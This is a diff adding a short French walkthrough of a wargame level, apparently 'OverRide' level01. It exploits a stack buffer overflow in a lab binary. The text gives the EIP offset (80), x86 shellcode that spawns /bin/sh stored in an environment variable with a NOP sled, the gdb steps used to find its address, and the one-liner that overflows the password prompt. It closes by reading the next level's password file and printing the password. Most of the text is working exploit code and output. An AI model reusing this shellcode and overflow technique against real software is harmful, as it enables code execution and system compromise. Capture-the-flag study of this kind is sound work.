@@ -1,0 +1,25 @@
+on utilisera https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+pour trouver a quel offset le buffer cause un overfow sur EIP.
+L'offset est de 80
+
+on cree pour cela une variable d environement:
+export SHCODE=`python -c "print('\x90' * 200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')"`
+
+grace a gdb on peut trouver on addresse avec:
+env -i SHCODE=$SHCODE gdb level01
+> start
+x/300s $esp
+
+la bonne addresse est: 0xffffde59, on va juste un peu apres pour ne plus avoir
+le nom de la variable, 0xffffde60
+
+level01@OverRide:~$ (echo dat_will ; python -c "print('\x90' * 80 + '\xff\xff\xde\x60'[::-1])" ; cat) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
